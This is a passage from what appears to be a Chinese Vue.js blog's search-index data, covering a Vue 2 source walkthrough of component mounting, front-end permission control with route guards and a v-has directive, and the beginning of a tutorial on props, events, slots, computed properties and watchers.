)    return this  &#125;  const options = this.$options  // resolve template/el and convert to render function  if (!options.render) &#123;    let template = options.template    // 存在template模板，解析vue模板文件    if (template) &#123;      if (typeof template === &#x27;string&#x27;) &#123;        if (template.charAt(0) === &#x27;#&#x27;) &#123;          template = idToTemplate(template)          /* istanbul ignore if */          if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; !template) &#123;            warn(              `Template element not found or is empty: $&#123;options.template&#125;`,              this            )          &#125;        &#125;      &#125; else if (template.nodeType) &#123;        template = template.innerHTML      &#125; else &#123;        if (process.env.NODE_ENV !== &#x27;production&#x27;) &#123;          warn(&#x27;invalid template option:&#x27; + template, this)        &#125;        return this      &#125;    &#125; else if (el) &#123;      // 通过选择器获取元素内容      template = getOuterHTML(el)    &#125;    if (template) &#123;      /* istanbul ignore if */      if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; config.performance &amp;&amp; mark) &#123;        mark(&#x27;compile&#x27;)      &#125;      /**       *  1.将temmplate解析ast tree       *  2.将ast tree转换成render语法字符串       *  3.生成render方法       */      const &#123; render, staticRenderFns &#125; = compileToFunctions(template, &#123;        outputSourceRange: process.env.NODE_ENV !== &#x27;production&#x27;,        shouldDecodeNewlines,        shouldDecodeNewlinesForHref,        delimiters: options.delimiters,        comments: options.comments      &#125;, this)      options.render = render      options.staticRenderFns = staticRenderFns      /* istanbul ignore if */      if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; config.performance &amp;&amp; mark) &#123;        mark(&#x27;compile end&#x27;)        measure(`vue $&#123;this._name&#125; compile`, &#x27;compile&#x27;, &#x27;compile end&#x27;)      &#125;    &#125;  &#125;  return mount.call(this, el, hydrating)&#125;\n\n阅读上面代码，我们能得到以下结论：\n\n不要将根元素放到body或者html上\n可以在对象中定义template/render或者直接使用template、el表示元素选择器\n最终都会解析成render函数，调用compileToFunctions，会将template解析成render函数\n\n对template的解析步骤大致分为以下几步：\n\n将html文档片段解析成ast描述符\n将ast描述符解析成字符串\n生成render函数\n\n生成render函数，挂载到vm上后，会再次调用mount方法\n源码位置：src\\platforms\\web\\runtime\\index.js\n// public mount methodVue.prototype.$mount = function (  el?: string | Element,  hydrating?: boolean): Component &#123;  el = el &amp;&amp; inBrowser ? query(el) : undefined  // 渲染组件  return mountComponent(this, el, hydrating)&#125;\n\n调用mountComponent渲染组件\nexport function mountComponent (  vm: Component,  el: ?Element,  hydrating?: boolean): Component &#123;  vm.$el = el  // 如果没有获取解析的render函数，则会抛出警告  // render是解析模板文件生成的  if (!vm.$options.render) &#123;    vm.$options.render = createEmptyVNode    if (process.env.NODE_ENV !== &#x27;production&#x27;) &#123;      /* istanbul ignore if */      if ((vm.$options.template &amp;&amp; vm.$options.template.charAt(0) !== &#x27;#&#x27;) ||        vm.$options.el || el) &#123;        warn(          &#x27;You are using the runtime-only build of Vue where the template &#x27; +          &#x27;compiler is not available. Either pre-compile the templates into &#x27; +          &#x27;render functions, or use the compiler-included build.&#x27;,          vm        )      &#125; else &#123;        // 没有获取到vue的模板文件        warn(          &#x27;Failed to mount component: template or render function not defined.&#x27;,          vm        )      &#125;    &#125;  &#125;  // 执行beforeMount钩子  callHook(vm, &#x27;beforeMount&#x27;)  let updateComponent  /* istanbul ignore if */  if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; config.performance &amp;&amp; mark) &#123;    updateComponent = () =&gt; &#123;      const name = vm._name      const id = vm._uid      const startTag = `vue-perf-start:$&#123;id&#125;`      const endTag = `vue-perf-end:$&#123;id&#125;`      mark(startTag)      const vnode = vm._render()      mark(endTag)      measure(`vue $&#123;name&#125; render`, startTag, endTag)      mark(startTag)      vm._update(vnode, hydrating)      mark(endTag)      measure(`vue $&#123;name&#125; patch`, startTag, endTag)    &#125;  &#125; else &#123;    // 定义更新函数    updateComponent = () =&gt; &#123;      // 实际调⽤是在lifeCycleMixin中定义的_update和renderMixin中定义的_render      vm._update(vm._render(), hydrating)    &#125;  &#125;  // we set this to vm._watcher inside the watcher&#x27;s constructor  // since the watcher&#x27;s initial patch may call $forceUpdate (e.g. inside child  // component&#x27;s mounted hook), which relies on vm._watcher being already defined  // 监听当前组件状态，当有数据变化时，更新组件  new Watcher(vm, updateComponent, noop, &#123;    before () &#123;      if (vm._isMounted &amp;&amp; !vm._isDestroyed) &#123;        // 数据更新引发的组件更新        callHook(vm, &#x27;beforeUpdate&#x27;)      &#125;    &#125;  &#125;, true /* isRenderWatcher */)  hydrating = false  // manually mounted instance, call mounted on self  // mounted is called for render-created child components in its inserted hook  if (vm.$vnode == null) &#123;    vm._isMounted = true    callHook(vm, &#x27;mounted&#x27;)  &#125;  return vm&#125;\n\n阅读上面代码，我们得到以下结论：\n\n会触发beforeCreate钩子\n定义updateComponent渲染页面视图的方法\n监听组件数据，一旦发生变化，触发beforeUpdate生命钩子\n\nupdateComponent方法主要执行在vue初始化时声明的render，update方法\nrender`的作用主要是生成`vnode\n\n源码位置：src\\core\\instance\\render.js\n// 定义vue 原型上的render方法Vue.prototype._render = function (): VNode &#123;    const vm: Component = this    // render函数来自于组件的option    const &#123; render, _parentVnode &#125; = vm.$options    if (_parentVnode) &#123;        vm.$scopedSlots = normalizeScopedSlots(            _parentVnode.data.scopedSlots,            vm.$slots,            vm.$scopedSlots        )    &#125;    // set parent vnode. this allows render functions to have access    // to the data on the placeholder node.    vm.$vnode = _parentVnode    // render self    let vnode    try &#123;        // There&#x27;s no need to maintain a stack because all render fns are called        // separately from one another. Nested component&#x27;s render fns are called        // when parent component is patched.        currentRenderingInstance = vm        // 调用render方法，自己的独特的render方法， 传入createElement参数，生成vNode        vnode = render.call(vm._renderProxy, vm.$createElement)    &#125; catch (e) &#123;        handleError(e, vm, `render`)        // return error render result,        // or previous vnode to prevent render error causing blank component        /* istanbul ignore else */        if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; vm.$options.renderError) &#123;            try &#123;                vnode = vm.$options.renderError.call(vm._renderProxy, vm.$createElement, e)            &#125; catch (e) &#123;                handleError(e, vm, `renderError`)                vnode = vm._vnode            &#125;        &#125; else &#123;            vnode = vm._vnode        &#125;    &#125; finally &#123;        currentRenderingInstance = null    &#125;    // if the returned array contains only a single node, allow it    if (Array.isArray(vnode) &amp;&amp; vnode.length === 1) &#123;        vnode = vnode[0]    &#125;    // return empty vnode in case the render function errored out    if (!(vnode instanceof VNode)) &#123;        if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; Array.isArray(vnode)) &#123;            warn(                &#x27;Multiple root nodes returned from render function. Render function &#x27; +                &#x27;should return a single root node.&#x27;,                vm            )        &#125;        vnode = createEmptyVNode()    &#125;    // set parent    vnode.parent = _parentVnode    return vnode&#125;\n\n_update主要功能是调用patch，将vnode转换为真实DOM，并且更新到页面中\n源码位置：src\\core\\instance\\lifecycle.js\nVue.prototype._update = function (vnode: VNode, hydrating?: boolean) &#123;    const vm: Component = this    const prevEl = vm.$el    const prevVnode = vm._vnode    // 设置当前激活的作用域    const restoreActiveInstance = setActiveInstance(vm)    vm._vnode = vnode    // Vue.prototype.__patch__ is injected in entry points    // based on the rendering backend used.    if (!prevVnode) &#123;      // initial render      // 执行具体的挂载逻辑      vm.$el = vm.__patch__(vm.$el, vnode, hydrating, false /* removeOnly */)    &#125; else &#123;      // updates      vm.$el = vm.__patch__(prevVnode, vnode)    &#125;    restoreActiveInstance()    // update __vue__ reference    if (prevEl) &#123;      prevEl.__vue__ = null    &#125;    if (vm.$el) &#123;      vm.$el.__vue__ = vm    &#125;    // if parent is an HOC, update its $el as well    if (vm.$vnode &amp;&amp; vm.$parent &amp;&amp; vm.$vnode === vm.$parent._vnode) &#123;      vm.$parent.$el = vm.$el    &#125;    // updated hook is called by the scheduler to ensure that children are    // updated in a parent&#x27;s updated hook.  &#125;\n\n三、结论\nnew Vue的时候调用会调用_init方法\n定义 $set、$get 、$delete、$watch 等方法\n定义 $on、$off、$emit、$off等事件\n定义 _update、$forceUpdate、$destroy生命周期\n\n\n调用$mount进行页面的挂载\n挂载的时候主要是通过mountComponent方法\n定义updateComponent更新函数\n执行render生成虚拟DOM\n_update将虚拟DOM生成真实DOM结构，并且渲染到页面中\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-权限管理","url":"/2018/08/10/Vue/vue-%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/","content":"一、是什么权限是对特定资源的访问许可，所谓权限控制，也就是确保用户只能访问到被分配的资源\n而前端权限归根结底是请求的发起权，请求的发起可能有下面两种形式触发\n\n页面加载触发\n页面上的按钮点击触发\n\n总的来说，所有的请求发起都触发自前端路由或视图\n所以我们可以从这两方面入手，对触发权限的源头进行控制，最终要实现的目标是：\n\n路由方面，用户登录后只能看到自己有权访问的导航菜单，也只能访问自己有权访问的路由地址，否则将跳转 4xx 提示页\n视图方面，用户只能看到自己有权浏览的内容和有权操作的控件\n最后再加上请求控制作为最后一道防线，路由可能配置失误，按钮可能忘了加权限，这种时候请求控制可以用来兜底，越权请求将在前端被拦截\n\n二、如何做前端权限控制可以分为四个方面：\n\n接口权限\n按钮权限\n菜单权限\n路由权限\n\n接口权限接口权限目前一般采用jwt的形式来验证，没有通过的话一般返回401，跳转到登录页面重新进行登录\n登录完拿到token，将token存起来，通过axios请求拦截器进行拦截，每次请求的时候头部携带token\naxios.interceptors.request.use(config =&gt; &#123;    config.headers[&#x27;token&#x27;] = cookie.get(&#x27;token&#x27;)    return config&#125;)axios.interceptors.response.use(res=&gt;&#123;&#125;,&#123;response&#125;=&gt;&#123;    if (response.data.code === 40099 || response.data.code === 40098) &#123; //token过期或者错误        router.push(&#x27;/login&#x27;)    &#125;&#125;)\n\n路由权限控制方案一\n初始化即挂载全部路由，并且在路由上标记相应的权限信息，每次路由跳转前做校验\nconst routerMap = [  &#123;    path: &#x27;/permission&#x27;,    component: Layout,    redirect: &#x27;/permission/index&#x27;,    alwaysShow: true, // will always show the root menu    meta: &#123;      title: &#x27;permission&#x27;,      icon: &#x27;lock&#x27;,      roles: [&#x27;admin&#x27;, &#x27;editor&#x27;] // you can set roles in root nav    &#125;,    children: [&#123;      path: &#x27;page&#x27;,      component: () =&gt; import(&#x27;@/views/permission/page&#x27;),      name: &#x27;pagePermission&#x27;,      meta: &#123;        title: &#x27;pagePermission&#x27;,        roles: [&#x27;admin&#x27;] // or you can only set roles in sub nav      &#125;    &#125;, &#123;      path: &#x27;directive&#x27;,      component: () =&gt; import(&#x27;@/views/permission/directive&#x27;),      name: &#x27;directivePermission&#x27;,      meta: &#123;        title: &#x27;directivePermission&#x27;        // if do not set roles, means: this page does not require permission      &#125;    &#125;]  &#125;]\n\n这种方式存在以下四种缺点：\n\n加载所有的路由，如果路由很多，而用户并不是所有的路由都有权限访问，对性能会有影响。\n全局路由守卫里，每次路由跳转都要做权限判断。\n菜单信息写死在前端，要改个显示文字或权限信息，需要重新编译\n菜单跟路由耦合在一起，定义路由的时候还有添加菜单显示标题，图标之类的信息，而且路由不一定作为菜单显示，还要多加字段进行标识\n\n方案二\n初始化的时候先挂载不需要权限控制的路由，比如登录页，404等错误页。如果用户通过URL进行强制访问，则会直接进入404，相当于从源头上做了控制\n登录后，获取用户的权限信息，然后筛选有权限访问的路由，在全局路由守卫里进行调用addRoutes添加路由\nimport router from &#x27;./router&#x27;import store from &#x27;./store&#x27;import &#123; Message &#125; from &#x27;element-ui&#x27;import NProgress from &#x27;nprogress&#x27; // progress barimport &#x27;nprogress/nprogress.css&#x27;// progress bar styleimport &#123; getToken &#125; from &#x27;@/utils/auth&#x27; // getToken from cookieNProgress.configure(&#123; showSpinner: false &#125;)// NProgress Configuration// permission judge functionfunction hasPermission(roles, permissionRoles) &#123;  if (roles.indexOf(&#x27;admin&#x27;) &gt;= 0) return true // admin permission passed directly  if (!permissionRoles) return true  return roles.some(role =&gt; permissionRoles.indexOf(role) &gt;= 0)&#125;const whiteList = [&#x27;/login&#x27;, &#x27;/authredirect&#x27;]// no redirect whitelistrouter.beforeEach((to, from, next) =&gt; &#123;  NProgress.start() // start progress bar  if (getToken()) &#123; // determine if there has token    /* has token*/    if (to.path === &#x27;/login&#x27;) &#123;      next(&#123; path: &#x27;/&#x27; &#125;)      NProgress.done() // if current page is dashboard will not trigger\tafterEach hook, so manually handle it    &#125; else &#123;      if (store.getters.roles.length === 0) &#123; // 判断当前用户是否已拉取完user_info信息        store.dispatch(&#x27;GetUserInfo&#x27;).then(res =&gt; &#123; // 拉取user_info          const roles = res.data.roles // note: roles must be a array! such as: [&#x27;editor&#x27;,&#x27;develop&#x27;]          store.dispatch(&#x27;GenerateRoutes&#x27;, &#123; roles &#125;).then(() =&gt; &#123; // 根据roles权限生成可访问的路由表            router.addRoutes(store.getters.addRouters) // 动态添加可访问路由表            next(&#123; ...to, replace: true &#125;) // hack方法 确保addRoutes已完成 ,set the replace: true so the navigation will not leave a history record          &#125;)        &#125;).catch((err) =&gt; &#123;          store.dispatch(&#x27;FedLogOut&#x27;).then(() =&gt; &#123;            Message.error(err || &#x27;Verification failed, please login again&#x27;)            next(&#123; path: &#x27;/&#x27; &#125;)          &#125;)        &#125;)      &#125; else &#123;        // 没有动态改变权限的需求可直接next() 删除下方权限判断 ↓        if (hasPermission(store.getters.roles, to.meta.roles)) &#123;          next()//        &#125; else &#123;          next(&#123; path: &#x27;/401&#x27;, replace: true, query: &#123; noGoBack: true &#125;&#125;)        &#125;        // 可删 ↑      &#125;    &#125;  &#125; else &#123;    /* has no token*/    if (whiteList.indexOf(to.path) !== -1) &#123; // 在免登录白名单，直接进入      next()    &#125; else &#123;      next(&#x27;/login&#x27;) // 否则全部重定向到登录页      NProgress.done() // if current page is login will not trigger afterEach hook, so manually handle it    &#125;  &#125;&#125;)router.afterEach(() =&gt; &#123;  NProgress.done() // finish progress bar&#125;)\n\n按需挂载，路由就需要知道用户的路由权限，也就是在用户登录进来的时候就要知道当前用户拥有哪些路由权限\n这种方式也存在了以下的缺点：\n\n全局路由守卫里，每次路由跳转都要做判断\n菜单信息写死在前端，要改个显示文字或权限信息，需要重新编译\n菜单跟路由耦合在一起，定义路由的时候还有添加菜单显示标题，图标之类的信息，而且路由不一定作为菜单显示，还要多加字段进行标识\n\n菜单权限菜单权限可以理解成将页面与理由进行解耦\n方案一菜单与路由分离，菜单由后端返回\n前端定义路由信息\n&#123;    name: &quot;login&quot;,    path: &quot;/login&quot;,    component: () =&gt; import(&quot;@/pages/Login.vue&quot;)&#125;\n\nname字段都不为空，需要根据此字段与后端返回菜单做关联，后端返回的菜单信息中必须要有name对应的字段，并且做唯一性校验\n全局路由守卫里做判断\nfunction hasPermission(router, accessMenu) &#123;  if (whiteList.indexOf(router.path) !== -1) &#123;    return true;  &#125;  let menu = Util.getMenuByName(router.name, accessMenu);  if (menu.name) &#123;    return true;  &#125;  return false;&#125;Router.beforeEach(async (to, from, next) =&gt; &#123;  if (getToken()) &#123;    let userInfo = store.state.user.userInfo;    if (!userInfo.name) &#123;      try &#123;        await store.dispatch(&quot;GetUserInfo&quot;)        await store.dispatch(&#x27;updateAccessMenu&#x27;)        if (to.path === &#x27;/login&#x27;) &#123;          next(&#123; name: &#x27;home_index&#x27; &#125;)        &#125; else &#123;          //Util.toDefaultPage([...routers], to.name, router, next);          next(&#123; ...to, replace: true &#125;)//菜单权限更新完成,重新进一次当前路由        &#125;      &#125;        catch (e) &#123;        if (whiteList.indexOf(to.path) !== -1) &#123; // 在免登录白名单，直接进入          next()        &#125; else &#123;          next(&#x27;/login&#x27;)        &#125;      &#125;    &#125; else &#123;      if (to.path === &#x27;/login&#x27;) &#123;        next(&#123; name: &#x27;home_index&#x27; &#125;)      &#125; else &#123;        if (hasPermission(to, store.getters.accessMenu)) &#123;          Util.toDefaultPage(store.getters.accessMenu,to, routes, next);        &#125; else &#123;          next(&#123; path: &#x27;/403&#x27;,replace:true &#125;)        &#125;      &#125;    &#125;  &#125; else &#123;    if (whiteList.indexOf(to.path) !== -1) &#123; // 在免登录白名单，直接进入      next()    &#125; else &#123;      next(&#x27;/login&#x27;)    &#125;  &#125;  let menu = Util.getMenuByName(to.name, store.getters.accessMenu);  Util.title(menu.title);&#125;);Router.afterEach((to) =&gt; &#123;  window.scrollTo(0, 0);&#125;);\n\n每次路由跳转的时候都要判断权限，这里的判断也很简单，因为菜单的name与路由的name是一一对应的，而后端返回的菜单就已经是经过权限过滤的\n如果根据路由name找不到对应的菜单，就表示用户有没权限访问\n如果路由很多，可以在应用初始化的时候，只挂载不需要权限控制的路由。取得后端返回的菜单后，根据菜单与路由的对应关系，筛选出可访问的路由，通过addRoutes动态挂载\n这种方式的缺点：\n\n菜单需要与路由做一一对应，前端添加了新功能，需要通过菜单管理功能添加新的菜单，如果菜单配置的不对会导致应用不能正常使用\n全局路由守卫里，每次路由跳转都要做判断\n\n方案二菜单和路由都由后端返回\n前端统一定义路由组件\nconst Home = () =&gt; import(&quot;../pages/Home.vue&quot;);const UserInfo = () =&gt; import(&quot;../pages/UserInfo.vue&quot;);export default &#123;    home: Home,    userInfo: UserInfo&#125;;\n\n后端路由组件返回以下格式\n[    &#123;        name: &quot;home&quot;,        path: &quot;/&quot;,        component: &quot;home&quot;    &#125;,    &#123;        name: &quot;home&quot;,        path: &quot;/userinfo&quot;,        component: &quot;userInfo&quot;    &#125;]\n\n在将后端返回路由通过addRoutes动态挂载之间，需要将数据处理一下，将component字段换为真正的组件\n如果有嵌套路由，后端功能设计的时候，要注意添加相应的字段，前端拿到数据也要做相应的处理\n这种方法也会存在缺点：\n\n全局路由守卫里，每次路由跳转都要做判断\n前后端的配合要求更高\n\n按钮权限方案一按钮权限也可以用v-if判断\n但是如果页面过多，每个页面页面都要获取用户权限role和路由表里的meta.btnPermissions，然后再做判断\n这种方式就不展开举例了\n方案二通过自定义指令进行按钮权限的判断\n首先配置路由\n&#123;    path: &#x27;/permission&#x27;,    component: Layout,    name: &#x27;权限测试&#x27;,    meta: &#123;        btnPermissions: [&#x27;admin&#x27;, &#x27;supper&#x27;, &#x27;normal&#x27;]    &#125;,    //页面需要的权限    children: [&#123;        path: &#x27;supper&#x27;,        component: _import(&#x27;system/supper&#x27;),        name: &#x27;权限测试页&#x27;,        meta: &#123;            btnPermissions: [&#x27;admin&#x27;, &#x27;supper&#x27;]        &#125; //页面需要的权限    &#125;,    &#123;        path: &#x27;normal&#x27;,        component: _import(&#x27;system/normal&#x27;),        name: &#x27;权限测试页&#x27;,        meta: &#123;            btnPermissions: [&#x27;admin&#x27;]        &#125; //页面需要的权限    &#125;]&#125;\n\n自定义权限鉴定指令\nimport Vue from &#x27;vue&#x27;/**权限指令**/const has = Vue.directive(&#x27;has&#x27;, &#123;    bind: function (el, binding, vnode) &#123;        // 获取页面按钮权限        let btnPermissionsArr = [];        if(binding.value)&#123;            // 如果指令传值，获取指令参数，根据指令参数和当前登录人按钮权限做比较。            btnPermissionsArr = Array.of(binding.value);        &#125;else&#123;            // 否则获取路由中的参数，根据路由的btnPermissionsArr和当前登录人按钮权限做比较。            btnPermissionsArr = vnode.context.$route.meta.btnPermissions;        &#125;        if (!Vue.prototype.$_has(btnPermissionsArr)) &#123;            el.parentNode.removeChild(el);        &#125;    &#125;&#125;);// 权限检查方法Vue.prototype.$_has = function (value) &#123;    let isExist = false;    // 获取用户按钮权限    let btnPermissionsStr = sessionStorage.getItem(&quot;btnPermissions&quot;);    if (btnPermissionsStr == undefined || btnPermissionsStr == null) &#123;        return false;    &#125;    if (value.indexOf(btnPermissionsStr) &gt; -1) &#123;        isExist = true;    &#125;    return isExist;&#125;;export &#123;has&#125;\n\n在使用的按钮中只需要引用v-has指令\n&lt;el-button @click=&#x27;editClick&#x27; type=&quot;primary&quot; v-has&gt;编辑&lt;/el-button&gt;\n\n小结关于权限如何选择哪种合适的方案，可以根据自己项目的方案项目，如考虑路由与菜单是否分离\n权限需要前后端结合，前端尽可能的去控制，更多的需要后台判断\n","categories":["框架"],"tags":["vue"]},{"title":"vue-核心知识总结","url":"/2018/07/31/Vue/vue-%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86/","content":"一、组件的核心概念-属性props几种写法\n我们的开发都是围绕着options来的\n\n\n\n&lt;template&gt;  &lt;div&gt;    name: &#123;&#123; name &#125;&#125;    &lt;br /&gt;    type: &#123;&#123; type &#125;&#125;    &lt;br /&gt;    list: &#123;&#123; list &#125;&#125;    &lt;br /&gt;    isVisible: &#123;&#123; isVisible &#125;&#125;    &lt;br /&gt;    &lt;button @click=&quot;handleClick&quot;&gt;change type&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &quot;PropsDemo&quot;,  // inheritAttrs: false,  // 这种写法不利于后期维护  // props: [&#x27;name&#x27;, &#x27;type&#x27;, &#x27;list&#x27;, &#x27;isVisible&#x27;],  props: &#123;    name: String,    type: &#123;      validator: function(value) &#123;        // 这个值必须匹配下列字符串中的一个        return [&quot;success&quot;, &quot;warning&quot;, &quot;danger&quot;].includes(value);      &#125;    &#125;,    list: &#123;      type: Array,      // 对象或数组默认值必须从一个工厂函数获取      default: () =&gt; []    &#125;,    isVisible: &#123;      type: Boolean,      default: false    &#125;,    onChange: &#123;      type: Function,      default: () =&gt; &#123;&#125;    &#125;  &#125;,  methods: &#123;    handleClick() &#123;      // 不要这么做、不要这么做、不要这么做      // this.type = &quot;warning&quot;;      // 可以，还可以更好      this.onChange(this.type === &quot;success&quot; ? &quot;warning&quot; : &quot;success&quot;);    &#125;  &#125;&#125;;&lt;/script&gt;// 用法&lt;Props  name=&quot;Hello Vue！&quot; // 原生属性  :type=&quot;type&quot;  :is-visible=&quot;false&quot;  :on-change=&quot;handlePropChange&quot;  title=&quot;属性Demo&quot; // 原生属性  class=&quot;test1&quot; // 原生属性  :class=&quot;[&#x27;test2&#x27;]&quot;  :style=&quot;&#123; marginTop: &#x27;20px&#x27; &#125;&quot;  style=&quot;margin-top: 10px&quot; // 原生属性/&gt;\n\n二、组件的核心概念-事件\n&lt;template&gt;  &lt;div&gt;    name: &#123;&#123; name || &quot;--&quot; &#125;&#125;    &lt;br /&gt;    &lt;input :value=&quot;name&quot; @change=&quot;handleChange&quot; /&gt;    &lt;br /&gt;    &lt;br /&gt;    &lt;div @click=&quot;handleDivClick&quot;&gt;      &lt;button @click=&quot;handleClick&quot;&gt;重置成功&lt;/button&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;      &lt;button @click.stop=&quot;handleClick&quot;&gt;重置失败&lt;/button&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &quot;EventDemo&quot;,  props: &#123;    name: String  &#125;,  methods: &#123;    handleChange(e) &#123;      this.$emit(&quot;change&quot;, e.target.value);    &#125;,    handleDivClick() &#123;      this.$emit(&quot;change&quot;, &quot;&quot;);    &#125;,    handleClick(e) &#123;      // 都会失败      //e.stopPropagation();    &#125;  &#125;&#125;;&lt;/script&gt;\n\n三、组件的核心概念-插槽\n &lt;a-tab-pane key=&quot;slot&quot; tab=&quot;插槽&quot;&gt;    &lt;h2&gt;2.6 新语法&lt;/h2&gt;    &lt;SlotDemo&gt;      &lt;p&gt;default slot&lt;/p&gt;      &lt;template v-slot:title&gt;        &lt;p&gt;title slot1&lt;/p&gt;        &lt;p&gt;title slot2&lt;/p&gt;      &lt;/template&gt;      &lt;template v-slot:item=&quot;props&quot;&gt;        &lt;p&gt;item slot-scope &#123;&#123; props &#125;&#125;&lt;/p&gt;      &lt;/template&gt;    &lt;/SlotDemo&gt;    &lt;br /&gt;    &lt;h2&gt;老语法&lt;/h2&gt;    &lt;SlotDemo&gt;      &lt;p&gt;default slot&lt;/p&gt;      &lt;p slot=&quot;title&quot;&gt;title slot1&lt;/p&gt;      &lt;p slot=&quot;title&quot;&gt;title slot2&lt;/p&gt;      &lt;p slot=&quot;item&quot; slot-scope=&quot;props&quot;&gt;item slot-scope &#123;&#123; props &#125;&#125;&lt;/p&gt;    &lt;/SlotDemo&gt;&lt;/a-tab-pane&gt;&lt;script&gt;import Slot from &quot;./Slot&quot;;export default &#123;  components: &#123;    SlotDemo: Slot  &#125;,  data: () =&gt; &#123;    return &#123;      name: &quot;&quot;,      type: &quot;success&quot;,      bigPropsName: &quot;Hello world!&quot;    &#125;;  &#125;,&#125;;&lt;/script&gt;&lt;!-- Slot.vue --&gt;&lt;template&gt;  &lt;div&gt;    &lt;slot /&gt;    &lt;slot name=&quot;title&quot; /&gt;    &lt;slot name=&quot;item&quot; v-bind=&quot;&#123; value: &#x27;vue&#x27; &#125;&quot; /&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &quot;SlotDemo&quot;&#125;;&lt;/script&gt;\n\n\n大属性例子\n&lt;!--子组件 bigProps.vue--&gt;&lt;template&gt;  &lt;div&gt;    &#123;&#123; name &#125;&#125;    &lt;br /&gt;    &lt;button @click=&quot;handleChange&quot;&gt;change name&lt;/button&gt;    &lt;br /&gt;    &lt;!-- &#123;&#123; slotDefault &#125;&#125; --&gt;    &lt;VNodes :vnodes=&quot;slotDefault&quot; /&gt;    &lt;br /&gt;    &lt;VNodes :vnodes=&quot;slotTitle&quot; /&gt;    &lt;br /&gt;    &lt;VNodes :vnodes=&quot;slotScopeItem(&#123; value: &#x27;vue&#x27; &#125;)&quot; /&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &quot;BigProps&quot;,  components: &#123;    VNodes: &#123;      functional: true,      render: (h, ctx) =&gt; ctx.props.vnodes    &#125;  &#125;,  props: &#123;    name: String,    onChange: &#123;      type: Function,      default: () =&gt; &#123;&#125;    &#125;,    slotDefault: Array,    slotTitle: Array,    slotScopeItem: &#123;      type: Function,      default: () =&gt; &#123;&#125;    &#125;  &#125;,  methods: &#123;    handleChange() &#123;      this.onChange(&quot;Hello vue!&quot;);    &#125;  &#125;&#125;;&lt;/script&gt;&lt;!--父组件调用--&gt;&lt;a-tab-pane key=&quot;bigProps&quot; tab=&quot;大属性&quot;&gt;    &lt;BigProps      :name=&quot;bigPropsName&quot;      :on-change=&quot;handleBigPropChange&quot;      :slot-default=&quot;getDefault()&quot;      :slot-title=&quot;getTitle()&quot;      :slot-scope-item=&quot;getItem&quot;    /&gt;&lt;/a-tab-pane&gt;\n\n四、双向绑定和单项数据流并不冲突\n\n五、如何触发组件的更新\n\n\n六、合理应用计算属性和监听器6.1 计算属性Computed\n减少模板中的计算逻辑\n数据缓存\n依赖固定的数据类型（响应式数据）\n\n&lt;template&gt;  &lt;div&gt;    &lt;p&gt;Reversed message1: &quot;&#123;&#123; reversedMessage1 &#125;&#125;&quot;&lt;/p&gt;    &lt;p&gt;Reversed message2: &quot;&#123;&#123; reversedMessage2() &#125;&#125;&quot;&lt;/p&gt;    &lt;p&gt;&#123;&#123; now &#125;&#125;&lt;/p&gt;    &lt;button @click=&quot;() =&gt; $forceUpdate()&quot;&gt;forceUpdate&lt;/button&gt;    &lt;br /&gt;    &lt;input v-model=&quot;message&quot; /&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  data() &#123;    return &#123;      message: &quot;hello vue&quot;    &#125;;  &#125;,  computed: &#123;    // 计算属性的 getter    reversedMessage1: function() &#123;      console.log(&quot;执行reversedMessage1&quot;);      return this.message        .split(&quot;&quot;)        .reverse()        .join(&quot;&quot;);    &#125;,    now: function() &#123;      return Date.now();    &#125;  &#125;,  methods: &#123;    reversedMessage2: function() &#123;      console.log(&quot;执行reversedMessage2&quot;);      return this.message        .split(&quot;&quot;)        .reverse()        .join(&quot;&quot;);    &#125;  &#125;&#125;;&lt;/script&gt;\n\n6.2 监听watcher\n更加灵活通用\nwatcher可以执行任何逻辑，包括函数节流、ajax异步获取数据\n\n&lt;template&gt;  &lt;div&gt;    &#123;&#123; $data &#125;&#125;    &lt;br /&gt;    &lt;button @click=&quot;() =&gt; (a += 1)&quot;&gt;a+1&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  data: function() &#123;    return &#123;      a: 1,      b: &#123; c: 2, d: 3 &#125;,      e: &#123;        f: &#123;          g: 4        &#125;      &#125;,      h: []    &#125;;  &#125;,  watch: &#123;    a: function(val, oldVal) &#123;      this.b.c += 1;      console.log(&quot;new: %s, old: %s&quot;, val, oldVal);    &#125;,    &quot;b.c&quot;: function(val, oldVal) &#123;      this.b.d += 1;      console.log(&quot;new: %s, old: %s&quot;, val, oldVal);    &#125;,    &quot;b.d&quot;: function(val, oldVal) &#123;      this.e.f.g += 1;      console.log(&quot;new: %s, old: %s&quot;, val, oldVal);    &#125;,    e: &#123;      handler: function(val, oldVal) &#123;        this.h.push(&quot;😄&quot;);        console.log(&quot;new: %s, old: %s&quot;, val, oldVal);      &#125;,      deep: true    &#125;,    h(val, oldVal) &#123;      console.log(&quot;new: %s, old: %s&quot;, val, oldVal);    &#125;  &#125;&#125;;&lt;/script&gt;\n\nwatcher中使用节流\n&lt;template&gt;  &lt;div&gt;    &#123;&#123; fullName &#125;&#125;    &lt;div&gt;firstName: &lt;input v-model=&quot;firstName&quot; /&gt;&lt;/div&gt;    &lt;div&gt;lastName: &lt;input v-model=&quot;lastName&quot; /&gt;&lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  data: function() &#123;    return &#123;      firstName: &quot;Foo&quot;,      lastName: &quot;Bar&quot;,      fullName: &quot;Foo Bar&quot;    &#125;;  &#125;,  watch: &#123;    firstName: function(val) &#123;      clearTimeout(this.firstTimeout);      this.firstTimeout = setTimeout(() =&gt; &#123;        this.fullName = val + &quot; &quot; + this.lastName;      &#125;, 500);    &#125;,    lastName: function(val) &#123;      